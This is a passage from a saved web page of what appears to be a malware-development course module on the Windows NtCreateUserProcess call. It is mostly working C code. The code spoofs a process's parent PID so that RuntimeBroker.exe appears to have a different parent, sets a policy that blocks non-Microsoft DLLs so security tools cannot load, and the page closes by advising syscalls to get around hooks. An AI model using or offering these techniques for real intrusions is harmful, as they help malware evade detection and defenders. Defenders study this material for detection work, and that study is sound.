	pAttributeList-&gt;Attributes[0].Attribute        = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size             = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value            = (ULONG_PTR)UsNtImagePath.Buffer;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo = {
					.Size  = sizeof(PS_CREATE_INFO),
					.State = PsCreateInitialState
	};

	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h4>Custom RtlInitUnicodeString</h4>
<p>The <code>_RtlInitUnicodeString</code> function initializes a <code>UNICODE_STRING</code> structure with the provided wide string. Note that <code>_RtlInitUnicodeString</code> is a custom replacement function of the real one, that is <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitunicodestring" target="_blank">RtlInitUnicodeString</a>.</p>
<pre><code>VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct-&gt;Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length &gt; 0xfffc)
			Length = 0xfffc;

		UsStruct-&gt;Length = Length;
		UsStruct-&gt;MaximumLength = UsStruct-&gt;Length + sizeof(WCHAR);
	}

	else UsStruct-&gt;Length = UsStruct-&gt;MaximumLength = 0;
}
</code></pre>
<p>The second if-statement in the above function is to check if the 
calculated length (in bytes) is greater than the maximum size allowed 
for a <code>UNICODE_STRING</code> structure (<code>0xfffc</code>). If that's the case, the length is capped at the maximum size. Besides that, the function initializes the inputted <code>UNICODE_STRING</code>'s elements with the correct values.</p>
<h4>Main Function</h4>
<p>Use the main function below to call the <code>NtCreateUserProcessMinimalPoC</code>.</p>
<pre><code>
#define TARGET_PROCESS          L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PARMS           L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
#define PROCESS_PATH            L"C:\\Windows\\System32"


int main() {

  HANDLE	hProcess	= NULL,
		    hThread		= NULL;
	
  if (!NtCreateUserProcessMinimalPoC(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, &amp;hProcess, &amp;hThread))
	return -1;

  printf("[+] Target Process Created With Pid : %d \n", GetProcessId(hProcess));
  printf("[+] Process's Main Thread Created With Tid : %d \n", GetThreadId(hThread));
  return 0;
}	
</code></pre>
<h4>Results</h4>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-526114852-0ea90178-69cb-4383-98c2-796ffb.png" alt="image"></p>
<p>Which looks similar to that of a legit RuntimeBroker (except for the parent Process).</p>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-626114907-67b9501b-6e77-42b2-98a1-f7eac8.png" alt="image"></p>
<h3>PPID Spoofing Using NtCreateUserProcess</h3>
<p>The next usage of <code>NtCreateUserProcess</code> will be for performing PPID spoofing. Note that <code>PS_ATTRIBUTE_LIST</code> needs to be modified to allow an additional attribute as shown below.</p>
<pre><code>typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[2]; // Increment to 2 for an additional attribute

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre>
<p><code>NtCreateUserProcessForPPidSpoofing</code> is a custom function that performs PPID spoofing. The function is similar to <code>NtCreateUserProcessMinimalPoC</code>, with the main difference being that the additional attribute uses the <code>PS_ATTRIBUTE_PARENT_PROCESS</code> flag to specify the spoofed parent process.</p>
<pre><code>BOOL NtCreateUserProcessForPPidSpoofing(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	IN      HANDLE  hParentProcess,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {

	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL) 
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;
	
	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);
	
	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type 'PS_ATTRIBUTE_PARENT_PROCESS' that specifies the process's parent
	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList-&gt;Attributes[1].Size              = sizeof(HANDLE);
	pAttributeList-&gt;Attributes[1].Value             = hParentProcess;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo = {
					.Size	= sizeof(PS_CREATE_INFO),
					.State	= PsCreateInitialState
	};
	
	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h4>Main Function</h4>
<p>The main function below invokes <code>NtCreateUserProcessForPPidSpoofing</code> to perform PPID spoofing.</p>
<pre><code>#define TARGET_PROCESS          L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PARMS           L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
#define PROCESS_PATH            L"C:\\Windows\\System32"

#define PARENT_PID              4384

int main() {

  HANDLE	hProcess	= NULL,
		    hThread		= NULL;
		
  hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_PID);
  if (!NtCreateUserProcessForPPidSpoofing(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, hParentProcess, &amp;hProcess, &amp;hThread))
	return -1;

  printf("[+] Target Process Created With Pid : %d \n", GetProcessId(hProcess));
  printf("[+] Process's Main Thread Created With Tid : %d \n", GetThreadId(hThread));
  return 0;
}	

</code></pre>
<h4>Results</h4>
<p>The image below shows a process with a successfully spoofed parent process.</p>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-719850092-b93a1079-dfe7-4a3c-9db5-bc00c3.png" alt="image"></p>
<h3>Block DLL Policy Using NtCreateUserProcess</h3>
<p><code>NtCreateUserProcess</code> can also be used to enable the block DLL policy, which was introduced in the previous module. The <code>PS_ATTRIBUTE_LIST</code> structure will require two attributes. The additional attribute is set to <code>PS_ATTRIBUTE_MITIGATION_OPTIONS</code> which specifies the process mitigation options to use for the new process.</p>
<p><code>NtCreateUserProcessForBlockDllPolicy</code> is a custom function that enables the mitigation policy to block non-Microsoft signed DLLs.</p>
<pre><code>BOOL NtCreateUserProcessForBlockDllPolicy(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {

	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// the mitigation policy flag (attribute value)
	DWORD64                         dwBlockDllPolicy            = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type 'PS_ATTRIBUTE_MITIGATION_OPTIONS' that specifies the use of process's mitigation policies
	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList-&gt;Attributes[1].Size              = sizeof(DWORD64);
	pAttributeList-&gt;Attributes[1].Value             = &amp;dwBlockDllPolicy;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO					psCreateInfo = {
						.Size = sizeof(PS_CREATE_INFO),
						.State = PsCreateInitialState
	};


	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h4>Results</h4>
<p>Invoking <code>NtCreateUserProcessForBlockDllPolicy</code> will result in the output below.</p>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-819850671-388c86f6-beb3-4009-b03d-2854ea.png" alt="image"></p>
<h3>PPID Spoofing And Block DLL Policy</h3>
<p>Finally, this section merges the two previous implementations into a single one by modifying the <code>PS_ATTRIBUTE_LIST</code> structure to accommodate an extra attribute and subsequently invoking the <code>NtCreateUserProcessForBoth</code> function as shown below. The <code>PS_ATTRIBUTE_LIST</code> structure will require three attributes.</p>
<pre><code>BOOL NtCreateUserProcessForBoth(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	IN      HANDLE  hParentProcess,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {
		
	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// the mitigation policy flag (attribute value)
	DWORD64                         dwBlockDllPolicy            = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type 'PS_ATTRIBUTE_MITIGATION_OPTIONS' that specifies the use of process's mitigation policies
	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList-&gt;Attributes[1].Size              = sizeof(DWORD64);
	pAttributeList-&gt;Attributes[1].Value             = &amp;dwBlockDllPolicy;

	// intializing an attribute list of type 'PS_ATTRIBUTE_PARENT_PROCESS' that specifies the process's parent
	pAttributeList-&gt;Attributes[2].Attribute         = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList-&gt;Attributes[2].Size              = sizeof(HANDLE);
	pAttributeList-&gt;Attributes[2].Value             = hParentProcess;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo	= {
					.Size = sizeof(PS_CREATE_INFO),
					.State = PsCreateInitialState
	};

	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h4>Results</h4>
<p>Executing <code>NtCreateUserProcessForBoth</code> with the right parameter will result in the following</p>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-919850979-2cf51837-c6e8-448b-a038-ab24fb.png" alt="image"></p>
<h3>Improving The Implementation</h3>
<p>The <code>NtCreateUserProcess</code> function was retrieved using <code>GetProcAddress</code> and <code>GetModuleHandle</code> for the sake of simplicity. However, in a real-world scenario, it is recommended to use direct or indirect syscalls in case <code>NtCreateUserProcess</code> is hooked.</p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Create a process using NtCreateUserProcess and set the create process's attributes</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use NtCreateUserProcess in a previous imlpementation that used CreateProcess</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Call NtCreateUserProcess through the HellsHall tool</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/90"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/91/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/91/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Diving%20Into%20NtCreateUserProcess_files/jquery-3.6.0.min.js"></script>
        <script src="Diving%20Into%20NtCreateUserProcess_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Diving%20Into%20NtCreateUserProcess_files/app.4474f4d1.css"><link rel="modulepreload" href="Diving%20Into%20NtCreateUserProcess_files/app.5f3af5ce.js"><link rel="stylesheet" href="Diving%20Into%20NtCreateUserProcess_files/app.4474f4d1.css"><script type="module" src="Diving%20Into%20NtCreateUserProcess_files/app.5f3af5ce.js"></script><script src="Diving%20Into%20NtCreateUserProcess_files/navbar.js"></script>
<script src="Diving%20Into%20NtCreateUserProcess_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 91;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>